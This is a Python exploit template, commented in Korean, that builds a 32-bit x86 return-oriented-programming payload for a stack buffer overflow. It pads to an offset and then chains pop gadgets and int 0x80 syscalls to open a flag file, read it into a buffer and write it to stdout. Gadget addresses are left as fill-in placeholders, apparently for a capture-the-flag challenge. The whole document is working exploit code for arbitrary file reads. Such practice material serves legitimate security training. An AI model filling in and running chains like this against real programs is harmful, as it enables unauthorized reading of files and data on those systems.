import sys
from struct import pack

# ================================================
# syscall ORW ROP 체인 흐름
#   1. open(flag, 0, 0)
#   2. read(fd, outbuf, 40)
#   3. write(1, outbuf, 40)
# =================================================

p = lambda x: pack("<I", x)

# 필요한 값 세팅
OFFSET      = {offset}
FLAG        = {flag_addr}
OUTBUF      = {outbuf_addr}
POP_EAX     = {pop_eax}
POP_EBX     = {pop_ebx}
POP_ECX     = {pop_ecx}
POP_EDX     = {pop_edx}
MOV_EAX2EBX = {mov_eax2ebx}   # mov %eax, %ebx; ret
SYSCALL     = {int_0x80}   # int 0x80; ret

payload = b"A" * OFFSET

# ------------------------------------------------
# 1) open(flag, 0, 0)
#   eax=5, ebx=FLAG, ecx=0, edx=0
# ------------------------------------------------
payload += p(POP_EAX) + p(5)
payload += p(POP_EBX) + p(FLAG)
payload += p(POP_ECX) + p(0)
payload += p(POP_EDX) + p(0)
payload += p(SYSCALL)

# open의 반환 fd는 eax에 들어있음 → ebx로 옮겨서 read의 arg1로 사용
payload += p(MOV_EAX2EBX)

# ------------------------------------------------
# 2) read(fd, OUTBUF, 40)
#   eax=3, ebx=fd(이미 세팅됨), ecx=OUTBUF, edx=40
# ------------------------------------------------
payload += p(POP_EAX) + p(3)
payload += p(POP_ECX) + p(OUTBUF)
payload += p(POP_EDX) + p(40)
payload += p(SYSCALL)

# ------------------------------------------------
# 3) write(1, OUTBUF, 40)
#   eax=4, ebx=1, ecx=OUTBUF, edx=40
# ------------------------------------------------
payload += p(POP_EAX) + p(4)
payload += p(POP_EBX) + p(1)
payload += p(POP_ECX) + p(OUTBUF)
payload += p(POP_EDX) + p(40)
payload += p(SYSCALL)

sys.stdout.buffer.write(payload)
